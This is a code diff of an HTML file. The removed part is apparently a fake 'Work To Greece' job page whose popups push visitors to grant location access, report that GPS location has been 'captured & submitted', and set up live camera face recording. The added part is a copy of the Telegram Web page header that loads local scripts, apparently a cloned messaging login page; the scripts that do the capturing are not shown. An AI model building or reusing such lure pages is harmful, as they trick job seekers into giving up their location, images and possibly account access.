@@ -1,778 +1,118 @@
+
 <!DOCTYPE html>
 <html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Work To Greece — Find Your Dream Job</title>
-<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
-<style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body { font-family:'Open Sans',sans-serif; background:#f0f4ff; min-height:100vh; }
+  <head>
+    <meta charset="utf-8" />
+    <title>Telegram Web</title>
+    <meta name="description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no,viewport-fit=cover">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-title" content="Telegram Web">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="Telegram Web">
+    <meta name="application-name" content="Telegram Web">
+    <meta name="msapplication-TileColor" content="#2d89ef">
+    <meta name="msapplication-TileImage" content="assets/img/mstile-144x144.png?v=jw3mK7G9Ry">
+    <meta name="msapplication-config" content="browserconfig.xml?v=jw3mK7G9Ry">
+    <meta name="theme-color" content="#ffffff">
+    <meta name="color-scheme" content="light">
+    <meta name="google" content="notranslate">
 
-/* ── HERO ── */
-.hero {
-  position:relative; width:100%; min-height:520px;
-  overflow:hidden; display:flex; align-items:center;
-  background:linear-gradient(135deg,#003087 0%,#0050b3 40%,#0077cc 100%);
-}
-.hero-bg {
-  position:absolute; inset:0;
-  background:url('https://images.unsplash.com/photo-1570077188670-e3a8d69ac5ff?w=1400&q=80') center/cover no-repeat;
-  opacity:0.45; z-index:0;
-}
-.flag-overlay {
-  position:absolute; top:0; right:0; width:55%; height:100%; z-index:1;
-  background:url('https://upload.wikimedia.org/wikipedia/commons/5/5c/Flag_of_Greece.svg') top right/cover no-repeat;
-  opacity:0.18; transform:skewX(-8deg); transform-origin:top right;
-}
-.hero-content {
-  position:relative; z-index:2; padding:60px 60px 60px 56px;
-  max-width:560px; animation:fadeSlideIn 0.8s ease both;
-}
-@keyframes fadeSlideIn { from{opacity:0;transform:translateY(30px)} to{opacity:1;transform:translateY(0)} }
-.title-row { display:flex; align-items:center; gap:16px; margin-bottom:18px; }
-.flag-icon {
-  width:48px; height:32px; border-radius:3px;
-  border:1px solid rgba(255,255,255,0.3); flex-shrink:0;
-  overflow:hidden; box-shadow:0 2px 8px rgba(0,0,0,0.3); position:relative;
-  background:linear-gradient(180deg,
-    #003087 0%,#003087 11.11%,#fff 11.11%,#fff 22.22%,
-    #003087 22.22%,#003087 33.33%,#fff 33.33%,#fff 44.44%,
-    #003087 44.44%,#003087 55.55%,#fff 55.55%,#fff 66.66%,
-    #003087 66.66%,#003087 77.77%,#fff 77.77%,#fff 88.88%,
-    #003087 88.88%,#003087 100%);
-}
-.flag-icon::before {
-  content:'+'; position:absolute; top:50%; left:35%;
-  transform:translate(-50%,-50%); color:#fff; font-size:20px;
-  font-weight:900; text-shadow:0 0 4px rgba(0,48,135,0.8);
-}
-.hero-pretitle { font-family:'Montserrat',sans-serif; font-size:13px; font-weight:600; color:rgba(255,255,255,0.85); letter-spacing:2px; text-transform:uppercase; margin-bottom:4px; }
-.hero h1 { font-family:'Montserrat',sans-serif; font-weight:900; line-height:1; color:#fff; }
-.hero h1 .work { font-size:52px; display:block; text-shadow:0 2px 20px rgba(0,0,0,0.4); }
-.hero h1 .greece { font-size:72px; display:block; color:#1E90FF; text-shadow:0 4px 30px rgba(30,144,255,0.6),0 0 60px rgba(30,144,255,0.3); letter-spacing:2px; }
-.hero-line { width:70px; height:3px; background:#1E90FF; border-radius:2px; margin:18px 0; }
-.hero-sub { font-size:16px; color:rgba(255,255,255,0.9); line-height:1.7; margin-bottom:36px; font-weight:400; max-width:380px; }
-.signup-btn {
-  display:inline-flex; align-items:center; gap:14px;
-  background:linear-gradient(135deg,#003087,#0055c8); color:#fff;
-  border:2px solid rgba(255,255,255,0.4); border-radius:50px;
-  padding:18px 44px; font-family:'Montserrat',sans-serif;
-  font-size:16px; font-weight:800; letter-spacing:2px;
-  cursor:pointer; text-transform:uppercase; transition:all 0.3s ease;
-  position:relative; overflow:hidden; box-shadow:0 8px 32px rgba(0,48,135,0.5);
-}
-.signup-btn::before { content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(255,255,255,0.15),transparent); opacity:0; transition:opacity 0.3s; border-radius:50px; }
-.signup-btn:hover::before { opacity:1; }
-.signup-btn:hover { transform:translateY(-3px); box-shadow:0 14px 40px rgba(0,48,135,0.7),0 0 0 3px rgba(30,144,255,0.4); border-color:rgba(255,255,255,0.7); }
-.signup-btn:active { transform:translateY(0); }
-.signup-btn .btn-icon { width:30px; height:30px; background:rgba(255,255,255,0.2); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:14px; flex-shrink:0; }
-.signup-btn .btn-arrow { font-size:20px; transition:transform 0.3s; }
-.signup-btn:hover .btn-arrow { transform:translateX(4px); }
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://web.telegram.org/k/">
+    <meta property="og:title" content="Telegram Web">
+    <meta property="og:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
+    <meta property="og:image" content="assets/img/android-chrome-192x192.png?v=jw3mK7G9Ry">
 
-/* FEATURES */
-.features-section { background:#fff; padding:36px 60px; box-shadow:0 4px 24px rgba(0,48,135,0.08); position:relative; z-index:3; }
-.features-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:0; max-width:900px; margin:0 auto; }
-.feature-item { display:flex; align-items:flex-start; gap:14px; padding:0 24px; border-right:1px solid #e8eef8; }
-.feature-item:first-child{padding-left:0} .feature-item:last-child{border-right:none}
-.feature-icon-wrap { width:48px; height:48px; background:#edf3ff; border-radius:12px; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
-.feature-icon-wrap svg { width:26px; height:26px; stroke:#003087; fill:none; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
-.feature-text h3 { font-family:'Montserrat',sans-serif; font-size:14px; font-weight:800; color:#111; margin-bottom:4px; }
-.feature-text p { font-size:12px; color:#666; line-height:1.5; }
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://web.telegram.org/k/">
+    <meta property="twitter:title" content="Telegram Web">
+    <meta property="twitter:description" content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
+    <meta property="twitter:image" content="assets/img/android-chrome-192x192.png?v=jw3mK7G9Ry">
 
-/* STATS */
-.stats-section { background:#003087; padding:28px 60px; }
-.stats-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:0; max-width:900px; margin:0 auto; }
-.stat-item { display:flex; align-items:center; gap:16px; padding:0 32px; border-right:1px solid rgba(255,255,255,0.15); }
-.stat-item:first-child{padding-left:0} .stat-item:last-child{border-right:none}
-.stat-icon { font-size:28px; flex-shrink:0; }
-.stat-text .num { font-family:'Montserrat',sans-serif; font-size:22px; font-weight:900; color:#fff; line-height:1; }
-.stat-text .label { font-size:11px; color:rgba(255,255,255,0.65); letter-spacing:1px; margin-top:2px; }
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/img/apple-touch-icon.png?v=jw3mK7G9Ry">
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/img/favicon-16x16.png?v=jw3mK7G9Ry">
+    <link rel="icon" type="image/png" sizes="32x32" href="assets/img/favicon-32x32.png?v=jw3mK7G9Ry">
+    <link rel="icon" type="image/png" sizes="192x192" href="assets/img/android-chrome-192x192.png?v=jw3mK7G9Ry">
+    <link rel="alternate icon" href="assets/img/favicon.ico?v=jw3mK7G9Ry" type="image/x-icon">
+    <link rel="canonical" href="https://web.telegram.org/">
 
-/* ══════════════ OVERLAY ══════════════ */
-.overlay {
-  position:fixed; inset:0;
-  background:rgba(0,15,50,0.85);
-  display:flex; align-items:center; justify-content:center;
-  z-index:9999; backdrop-filter:blur(14px);
-  animation:oFade 0.3s ease;
-  padding:20px;
-}
-.overlay.hidden { display:none; }
-@keyframes oFade { from{opacity:0} to{opacity:1} }
-
-/* POPUP BASE */
-.popup {
-  background:#ffffff;
-  border-radius:24px;
-  padding:40px 32px 32px;
-  max-width:400px; width:100%;
-  text-align:center;
-  box-shadow:0 40px 100px rgba(0,20,80,0.45), 0 0 0 1px rgba(255,255,255,0.08);
-  animation:popIn 0.45s cubic-bezier(.175,.885,.32,1.275);
-  position:relative; overflow:hidden;
-}
-@keyframes popIn { from{opacity:0;transform:scale(0.82) translateY(24px)} to{opacity:1;transform:scale(1) translateY(0)} }
-
-/* top accent bar */
-.popup::before {
-  content:''; position:absolute; top:0; left:0; right:0;
-  height:5px; background:linear-gradient(90deg,#003087,#1E90FF,#003087);
-  background-size:200% auto; animation:shimBar 3s linear infinite;
-}
-@keyframes shimBar { 0%{background-position:0%} 100%{background-position:200%} }
-
-.popup.green-bar::before { background:linear-gradient(90deg,#00843a,#00d964,#00843a); background-size:200% auto; animation:shimBar 3s linear infinite; }
-.popup.yellow-bar::before { background:linear-gradient(90deg,#e6a000,#ffd040,#e6a000); background-size:200% auto; animation:shimBar 3s linear infinite; }
-
-/* ── ICON CONTAINERS ── */
-.icon-wrap {
-  width:80px; height:80px; border-radius:50%;
-  margin:0 auto 20px;
-  display:flex; align-items:center; justify-content:center;
-  position:relative;
-}
-
-/* ── 3D LOCATION BALLOON (no needle, no shadow) ── */
-.pin-wrap {
-  width:80px; height:80px;
-  margin:0 auto 20px;
-  display:flex; align-items:center; justify-content:center;
-}
-.pin-head {
-  width:68px; height:68px; border-radius:50%;
-  background:radial-gradient(circle at 33% 30%, #ff8080 0%, #e63030 45%, #a00000 100%);
-  box-shadow:
-    inset -6px -6px 14px rgba(0,0,0,0.22),
-    inset 5px 5px 12px rgba(255,255,255,0.38),
-    0 10px 30px rgba(180,10,10,0.5),
-    0 3px 8px rgba(0,0,0,0.25);
-  position:relative;
-  animation:balloonFloat 2.2s ease-in-out infinite;
-}
-.pin-head::after {
-  content:'';
-  position:absolute; top:14px; left:14px;
-  width:18px; height:18px; border-radius:50%;
-  background:radial-gradient(circle at 38% 38%, rgba(255,255,255,0.95), rgba(255,255,255,0.15));
-}
-@keyframes balloonFloat {
-  0%,100%{transform:translateY(0)} 50%{transform:translateY(-7px)}
-}
-
-/* Green checkmark icon */
-.check-icon-wrap {
-  width:80px; height:80px; border-radius:18px;
-  margin:0 auto 20px;
-  background:linear-gradient(145deg,#27ae60,#1a7a40);
-  box-shadow:0 8px 0 #0d4f25, 0 12px 24px rgba(10,100,40,0.45), inset 0 2px 0 rgba(255,255,255,0.25);
-  display:flex; align-items:center; justify-content:center;
-  animation:iconFloat 3s ease-in-out infinite;
-}
-@keyframes iconFloat { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-5px)} }
-.check-icon-wrap svg { width:42px; height:42px; stroke:#fff; stroke-width:3; fill:none; stroke-linecap:round; stroke-linejoin:round; }
-
-/* Camera icon */
-.cam-icon-wrap {
-  width:80px; height:80px; border-radius:50%;
-  margin:0 auto 20px;
-  background:linear-gradient(145deg,#2c3e50,#1a252f);
-  box-shadow:0 8px 0 #0d1a22, 0 12px 28px rgba(0,0,0,0.4), inset 0 2px 0 rgba(255,255,255,0.1);
-  display:flex; align-items:center; justify-content:center;
-  animation:iconFloat 3s ease-in-out infinite 0.5s;
-  position:relative;
-}
-@keyframes recBlink{0%,100%{opacity:1}50%{opacity:0.15}}
-.cam-icon-wrap svg { width:40px; height:40px; fill:#ccc; }
-
-/* Warning icon */
-.warn-icon-wrap {
-  width:84px; height:84px;
-  margin:0 auto 20px;
-  position:relative;
-  display:flex; align-items:center; justify-content:center;
-  animation:iconFloat 3s ease-in-out infinite 0.8s;
-}
-.warn-triangle {
-  width:0; height:0;
-  border-left:42px solid transparent;
-  border-right:42px solid transparent;
-  border-bottom:74px solid #f0c040;
-  filter:drop-shadow(0 6px 16px rgba(200,150,0,0.5));
-  position:absolute;
-}
-.warn-triangle::after {
-  content:'';
-  position:absolute;
-  width:0; height:0;
-  top:12px; left:-34px;
-  border-left:34px solid transparent;
-  border-right:34px solid transparent;
-  border-bottom:60px solid #f9d94e;
-}
-.warn-exclaim {
-  position:relative; z-index:1;
-  font-family:'Montserrat',sans-serif;
-  font-size:36px; font-weight:900;
-  color:#7a4f00;
-  line-height:1;
-  margin-top:16px;
-  text-shadow:0 1px 0 rgba(255,255,255,0.3);
-}
-
-/* POPUP TEXT */
-.popup-title { font-family:'Montserrat',sans-serif; font-size:22px; font-weight:900; color:#0d1f5c; margin-bottom:10px; }
-.popup-title.green { color:#00843a; }
-.popup-title.amber { color:#8a5000; }
-.popup-sub { font-size:14px; color:#555; line-height:1.75; margin-bottom:22px; }
-.popup-sub strong { color:#003087; }
-
-/* STEP LIST */
-.step-list { text-align:left; margin-bottom:22px; border:1px solid #edf0f7; border-radius:14px; overflow:hidden; }
-.step-row { display:flex; align-items:center; gap:14px; padding:13px 16px; border-bottom:1px solid #f0f2f8; background:#fff; transition:background 0.2s; }
-.step-row:last-child { border-bottom:none; }
-.step-row:hover { background:#f8faff; }
-.step-num {
-  width:34px; height:34px; border-radius:50%;
-  display:flex; align-items:center; justify-content:center;
-  font-family:'Montserrat',sans-serif; font-size:14px; font-weight:900;
-  flex-shrink:0;
-}
-.step-num.done { background:linear-gradient(135deg,#27ae60,#1a7a40); color:#fff; box-shadow:0 3px 8px rgba(27,120,60,0.4); }
-.step-num.active { background:linear-gradient(135deg,#003087,#0055c8); color:#fff; box-shadow:0 3px 8px rgba(0,48,135,0.4); }
-.step-num.pending { background:#f0f0f0; color:#aaa; border:2px solid #e0e0e0; }
-.step-info .step-name { font-family:'Montserrat',sans-serif; font-size:13px; font-weight:800; color:#1a1a2e; }
-.step-info .step-desc { font-size:11px; color:#888; margin-top:2px; }
-
-/* ERROR BOX */
-.err-box { background:#fff0f0; border:1px solid #ffcccc; border-radius:10px; padding:12px 14px; margin-bottom:14px; font-size:13px; color:#c0392b; line-height:1.6; display:none; text-align:left; }
-
-/* PRIMARY BUTTON */
-.p-btn {
-  width:100%; padding:17px; border:none; border-radius:14px;
-  cursor:pointer; font-family:'Montserrat',sans-serif;
-  font-size:14px; font-weight:800; letter-spacing:0.8px;
-  transition:all 0.22s; margin-bottom:10px;
-  position:relative; overflow:hidden;
-  background:linear-gradient(135deg,#003087,#0055c8);
-  color:#fff;
-  box-shadow:0 5px 0 #001a5a, 0 8px 20px rgba(0,48,135,0.35);
-}
-.p-btn::after { content:''; position:absolute; top:0; left:0; right:0; height:50%; background:linear-gradient(180deg,rgba(255,255,255,0.18),transparent); border-radius:14px 14px 0 0; pointer-events:none; }
-.p-btn:hover { transform:translateY(-2px); box-shadow:0 7px 0 #001a5a, 0 12px 28px rgba(0,48,135,0.5); }
-.p-btn:active { transform:translateY(3px); box-shadow:0 2px 0 #001a5a, 0 4px 10px rgba(0,48,135,0.3); }
-.p-btn:disabled { opacity:0.55; cursor:not-allowed; transform:none; }
-.p-btn.amber-btn { background:linear-gradient(135deg,#d48000,#f0a500); box-shadow:0 5px 0 #7a4500, 0 8px 20px rgba(180,100,0,0.35); }
-.p-btn.amber-btn:hover { box-shadow:0 7px 0 #7a4500, 0 12px 28px rgba(180,100,0,0.5); }
-.p-btn.amber-btn:active { box-shadow:0 2px 0 #7a4500, 0 4px 10px rgba(180,100,0,0.3); }
-
-/* GHOST BUTTON */
-.g-btn {
-  width:100%; padding:14px; border:1.5px solid #e0e4ef; border-radius:14px;
-  background:transparent; color:#aaa; font-family:'Montserrat',sans-serif;
-  font-size:13px; font-weight:600; cursor:pointer; transition:all 0.2s;
-}
-.g-btn:hover { border-color:#bbb; color:#777; background:#fafafa; }
-
-/* CAMERA SECTION */
-.cam-wrap {
-  width:100%; height:210px; background:#0a0d18;
-  border-radius:14px; overflow:hidden; position:relative;
-  margin-bottom:14px; border:2px solid #1E90FF;
-  display:none;
-}
-#faceVideo { width:100%; height:100%; object-fit:cover; display:block; transform:scaleX(-1); }
-.cam-overlay { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; pointer-events:none; }
-.face-oval {
-  width:110px; height:145px;
-  border:3px solid rgba(30,200,100,0.9);
-  border-radius:50%;
-  box-shadow:0 0 0 3px rgba(30,200,100,0.2), inset 0 0 0 3px rgba(30,200,100,0.1), 0 0 20px rgba(30,200,100,0.3);
-  animation:ovalPulse 1.8s ease-in-out infinite;
-}
-@keyframes ovalPulse{0%,100%{box-shadow:0 0 0 3px rgba(30,200,100,0.2),0 0 20px rgba(30,200,100,0.3)}50%{box-shadow:0 0 0 8px rgba(30,200,100,0.1),0 0 35px rgba(30,200,100,0.5)}}
-.rec-badge {
-  position:absolute; top:10px; right:10px;
-  background:rgba(200,20,20,0.92); color:#fff;
-  font-family:'Montserrat',sans-serif; font-size:11px; font-weight:800;
-  padding:5px 11px; border-radius:20px;
-  display:none; align-items:center; gap:6px; letter-spacing:1px;
-  backdrop-filter:blur(4px);
-}
-.rec-badge.show { display:flex; }
-.rec-dot { width:8px; height:8px; border-radius:50%; background:#fff; animation:recBlink 0.75s ease-in-out infinite; }
-
-/* TIMER */
-.timer-wrap { display:none; margin-bottom:12px; }
-.timer-wrap.show { display:block; }
-.timer-bar { background:#e8edf8; border-radius:8px; height:9px; overflow:hidden; margin-bottom:8px; }
-.timer-fill { height:100%; border-radius:8px; width:0%; background:linear-gradient(90deg,#003087,#1E90FF,#00d4ff); transition:width 0.6s linear; }
-.timer-text { font-family:'Montserrat',sans-serif; font-size:12px; font-weight:700; color:#003087; text-align:center; }
-
-/* WARN BOX */
-.warn-card {
-  background:linear-gradient(135deg,#fffbe6,#fff8d0);
-  border:1.5px solid #f0c840; border-radius:14px;
-  padding:18px 16px; margin-bottom:16px; text-align:left;
-}
-.warn-card-title {
-  display:flex; align-items:center; gap:10px;
-  font-family:'Montserrat',sans-serif; font-size:13px; font-weight:900;
-  color:#7a4f00; margin-bottom:14px;
-}
-.warn-rule { display:flex; align-items:flex-start; gap:10px; margin-bottom:10px; }
-.warn-rule:last-child { margin-bottom:0; }
-.warn-num {
-  min-width:24px; height:24px; border-radius:50%;
-  background:linear-gradient(135deg,#f0a500,#d48000);
-  color:#fff; font-family:'Montserrat',sans-serif;
-  font-size:11px; font-weight:900;
-  display:flex; align-items:center; justify-content:center;
-  flex-shrink:0; margin-top:1px;
-  box-shadow:0 2px 6px rgba(200,100,0,0.3);
-}
-.warn-rule-text { font-size:13px; color:#5c3d00; line-height:1.55; }
-.warn-rule-text strong { color:#3d2800; }
-
-.loc-track {
-  display:flex; align-items:center; gap:12px;
-  background:#edf7ff; border:1.5px solid #b0d8ff;
-  border-radius:12px; padding:13px 15px; margin-bottom:18px;
-}
-.loc-pulse {
-  width:12px; height:12px; border-radius:50%;
-  background:#1E90FF; flex-shrink:0;
-  box-shadow:0 0 0 0 rgba(30,144,255,0.5);
-  animation:locPulse 1.4s ease-out infinite;
-}
-@keyframes locPulse{0%{box-shadow:0 0 0 0 rgba(30,144,255,0.6)}70%{box-shadow:0 0 0 10px rgba(30,144,255,0)}100%{box-shadow:0 0 0 0 rgba(30,144,255,0)}}
-.loc-track-text { font-family:'Montserrat',sans-serif; font-size:12px; font-weight:800; color:#003087; }
-
-/* TOAST */
-.toast {
-  position:fixed; bottom:32px; left:50%;
-  transform:translateX(-50%) translateY(120px);
-  background:linear-gradient(135deg,#003087,#0055c8);
-  color:#fff; padding:14px 28px; border-radius:50px;
-  font-family:'Montserrat',sans-serif; font-size:14px; font-weight:700;
-  box-shadow:0 8px 30px rgba(0,48,135,0.5), 0 0 0 1px rgba(255,255,255,0.15);
-  transition:transform 0.4s cubic-bezier(.175,.885,.32,1.275);
-  z-index:10000; white-space:nowrap;
-}
-.toast.show { transform:translateX(-50%) translateY(0); }
-
-/* RESPONSIVE */
-@media(max-width:768px){
-  .hero-content{padding:40px 24px}
-  .hero h1 .work{font-size:36px} .hero h1 .greece{font-size:52px}
-  .features-section{padding:28px 20px}
-  .features-grid{grid-template-columns:repeat(2,1fr);gap:20px}
-  .feature-item{border-right:none;border-bottom:1px solid #e8eef8;padding:0 0 16px}
-  .feature-item:last-child{border-bottom:none}
-  .stats-section{padding:24px 20px}
-  .stats-grid{grid-template-columns:repeat(2,1fr);gap:20px}
-  .stat-item{border-right:none;padding:0 0 14px;border-bottom:1px solid rgba(255,255,255,0.1)}
-  .stat-item:last-child{border-bottom:none}
-}
-</style>
-</head>
-<body>
-
-<!-- ══════════════════════════════
-  POPUP 1 — LOCATION CONFIRM
-══════════════════════════════ -->
-<div class="overlay hidden" id="geoOverlay">
-  <div class="popup">
-    <!-- 3D Location Balloon -->
-    <div class="pin-wrap">
-      <div class="pin-head"></div>
-    </div>
-
-    <h2 class="popup-title">Confirm Your Location</h2>
-    <p class="popup-sub">To access job opportunities in Greece, we need to <strong>verify your current location</strong>. Please tap <strong>"Allow"</strong> when your browser requests permission.</p>
-    <div class="err-box" id="geoErr"></div>
-    <button class="p-btn" id="geoBtn" onclick="requestLocation()">Allow Location &amp; Sign Up</button>
-    <button class="g-btn" onclick="closeAll()">Maybe Later</button>
-  </div>
-</div>
-
-<!-- ══════════════════════════════
-  POPUP 2 — REGISTRATION DONE
-══════════════════════════════ -->
-<div class="overlay hidden" id="regOverlay">
-  <div class="popup green-bar">
-    <div class="check-icon-wrap">
-      <svg viewBox="0 0 24 24"><polyline points="20,6 9,17 4,12"/></svg>
-    </div>
-    <h2 class="popup-title green">Registration Done!</h2>
-    <p class="popup-sub">Your account has been created successfully.<br>Please complete the remaining verification steps.</p>
-
-    <div class="step-list">
-      <div class="step-row">
-        <div class="step-num done">✓</div>
-        <div class="step-info">
-          <div class="step-name">Location Verified</div>
-          <div class="step-desc">GPS location captured &amp; submitted</div>
+    <link rel="manifest" id="manifest">
+    <script type="module" crossorigin src="./index-BwIBo_Hm.js"></script>
+    <link rel="stylesheet" crossorigin href="./index-tbKkqB5-.css">
+  </head>
+  <body class="animation-level-2 has-auth-pages rounded-sections">
+    <!--[if IE]>
+      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
+    <![endif]-->
+    <svg style="position: absolute; top: -10000px; left: -10000px;">
+      <defs id="svg-defs">
+        <clipPath id="tooltip-notch-clip">
+          <path d="M19 7C16.8992 7 13.59 3.88897 11.5003 1.67424C10.7648 0.894688 10.397 0.50491 10.0434 0.385149C9.70568 0.270811 9.4225 0.270474 9.08456 0.38401C8.73059 0.50293 8.36133 0.892443 7.62279 1.67147C5.52303 3.88637 2.18302 7 0 7L19 7Z" />
+        </clipPath>
+        <clipPath id="message-tail-clip">
+          <use href="#message-tail" />
+        </clipPath>
+        <clipPath id="story-item-clip" clipPathUnits="objectBoundingBox">
+          <path d="M0.5 0C0.776148 0 1 0.223852 1 0.5 1 0.776148 0.776148 1 0.5 1 0.419148 1 0.342778 0.980778 0.275185 0.946704 0.407333 0.84263 0.492185 0.681222 0.492185 0.5 0.492185 0.318741 0.407333 0.157333 0.275185 0.053259 0.342778 0.019185 0.419148 0 0.5 0Z" />
+        </clipPath>
+        <path id="message-tail" d="M1.00002881,1.03679295e-14 L7,0 L7,17 C6.8069969,14.1607017 6.12380234,11.2332513 4.95041634,8.21764872 C4.04604748,5.89342034 2.50413132,3.73337411 0.324667862,1.73751004 L0.324652538,1.73752677 C-0.0826597201,1.36452676 -0.110475289,0.731958677 0.262524727,0.324646419 C0.451952959,0.117792698 0.719544377,1.0985861e-14 1.00002881,1.04360964e-14 Z" />
+        <path id="logo" fill-rule="evenodd" d="M80,0 C124.18278,0 160,35.81722 160,80 C160,124.18278 124.18278,160 80,160 C35.81722,160 0,124.18278 0,80 C0,35.81722 35.81722,0 80,0 Z M114.262551,46.4516129 L114.123923,46.4516129 C111.089589,46.5056249 106.482806,48.0771432 85.1289541,56.93769 L81.4133571,58.4849956 C72.8664779,62.0684477 57.2607933,68.7965125 34.5963033,78.66919 C30.6591745,80.2345564 28.5967328,81.765936 28.4089783,83.2633288 C28.0626453,86.0254269 31.8703852,86.959903 36.7890378,88.5302703 L38.2642674,89.0045258 C42.3926354,90.314406 47.5534685,91.7248852 50.3250916,91.7847532 C52.9151948,91.8407003 55.7944784,90.8162976 58.9629426,88.7115451 L70.5121776,80.9327422 C85.6657026,70.7535853 93.6285785,65.5352892 94.4008055,65.277854 L94.6777873,65.216416 C95.1594319,65.1213105 95.7366278,65.0717596 96.1481181,65.4374337 C96.6344248,65.8695939 96.5866185,66.6880224 96.5351057,66.9075859 C96.127514,68.6448691 75.2839361,87.6143392 73.6629144,89.2417998 L73.312196,89.6016896 C68.7645143,94.2254793 63.9030972,97.1721503 71.5637945,102.355193 L73.3593638,103.544598 C79.0660342,107.334968 82.9483395,110.083813 88.8107882,113.958377 L90.3875424,114.996094 C95.0654739,118.061953 98.7330313,121.697601 103.562866,121.253237 C105.740839,121.052855 107.989107,119.042224 109.175465,113.09692 L109.246762,112.727987 C112.002037,98.0012935 117.417883,66.09303 118.669527,52.9443975 C118.779187,51.7924073 118.641237,50.318088 118.530455,49.6708963 L118.474159,49.3781963 C118.341081,48.7651315 118.067967,48.0040758 117.346762,47.4189793 C116.412565,46.6610871 115.002114,46.4638844 114.262551,46.4516129 Z"/>
+        <path id="poll-line" d="M4.47,5.33v13.6c0,4.97,4.03,9,9,9h458.16"/>
+        <path id="check" fill="none" d="M 4.7071 12.2929 l 5 5 c 0.3905 0.3905 1.0237 0.3905 1.4142 0 l 11 -11" />
+        <path id="checkbox-cross" d="M 4 4 L 20 20 M 20 4 L 4 20" fill="none" stroke-linecap="round"/>
+        <path id="verified-icon-background" fill-rule="evenodd" clip-rule="evenodd" d="m14.378741 1.509638 1.818245 1.818557c.365651.365716.861601.571194 1.378741.571259l2.574273.000312c1.01361.000117 1.846494.773578 1.940861 1.762436l.008905.187798-.000312 2.5727c-.000065.517322.205439 1.013454.571259 1.379222l1.819649 1.819337c.714441.713427.759174 1.843179.134563 2.609139l-.134797.148109-1.819181 1.8182502c-.365963.3657823-.571558.8620196-.571493 1.3794456l.000312 2.5737972c.000559 1.0136048-.772668 1.846676-1.7615 1.9412861l-.188266.0084786-2.573792-.0003107c-.517426-.0000624-1.013675.2055248-1.379456.5714956l-1.818245 1.8191823c-.71331.7145515-1.843049.7594886-2.609113.1349998l-.148135-.1347645-1.8193435-1.8196542c-.3657628-.3658252-.8618987-.5713214-1.3792103-.571259l-2.5727052.0003107c-1.0136048.0001222-1.846676-.7731321-1.9412861-1.761968l-.0089492-.1877967-.0003107-2.5742678c-.0000624-.5171478-.2055495-1.0130926-.571259-1.3787397l-1.8185622-1.8182515c-.7139886-.713869-.758706-1.843647-.1340846-2.609607l.1338493-.148109 1.8190328-1.81935c.3655665-.365625.5709613-.861471.5710237-1.378494l.0003107-2.573181c.0006006-1.076777.8734635-1.949636 1.9502353-1.950234l2.5731758-.000312c.5170321-.000065 1.0128768-.205452 1.3785044-.571025l1.8193448-1.819038c.761592-.761449 1.996254-.761345 2.757716.000247zm3.195309 8.047806c-.426556-.34125-1.032655-.306293-1.417455.060333l-.099151.108173-4.448444 5.55815-1.7460313-1.74707-.1104961-.096564c-.4229264-.32188-1.0291801-.289692-1.4154413.096564-.3862612.386269-.4184492.992511-.0965653 1.41544l.0965653.1105 2.5999987 2.5999987.109876.0961467c.419874.320359 1.015131.2873897 1.397071-.0773773l.098579-.107692 5.2-6.4999961.083772-.120484c.273208-.455884.174278-1.054885-.252278-1.396122z" />
+        <path id="verified-icon-check" d="M8 8H18V18H8V8Z" />
+        <path id="topic-icon" d="M21.3733 4.27035C19.2176 2.25323 16.2016 1 12.8636 1C6.31153 1 1 5.82866 1 11.7851C1 15.1823 2.58685 17.9669 5.28707 19.9438C5.63238 20.1966 5.95042 21.6013 5.18073 22.7812C4.86598 23.2637 4.51948 23.639 4.25272 23.928C3.86715 24.3457 3.6482 24.5828 3.93266 24.7022C4.22935 24.8266 5.98245 24.8882 7.24776 24.1786C8.23812 23.6232 8.83793 23.0691 9.24187 22.696C9.57588 22.3875 9.77595 22.2027 9.95217 22.2431C10.584 22.388 11.236 22.4868 11.9035 22.5354C11.9126 22.5361 11.9218 22.5368 11.9309 22.5374C12.2386 22.5592 12.5497 22.5702 12.8636 22.5702C19.4157 22.5702 24.7273 17.7416 24.7273 11.7851C24.7273 8.86318 23.4491 6.21263 21.3733 4.27035Z" />
+        <symbol id="message-tail-filled" viewBox="0 0 11 20">
+          <g transform="translate(9 -14)" fill="inherit" fill-rule="evenodd">
+            <path d="M-6 16h6v17c-.193-2.84-.876-5.767-2.05-8.782-.904-2.325-2.446-4.485-4.625-6.48A1 1 0 01-6 16z" transform="matrix(1 0 0 -1 0 49)" id="corner-fill" fill="inherit"/>
+          </g>
+        </symbol>
+        <symbol id="star-sparkle" viewBox="0 0 7 7">
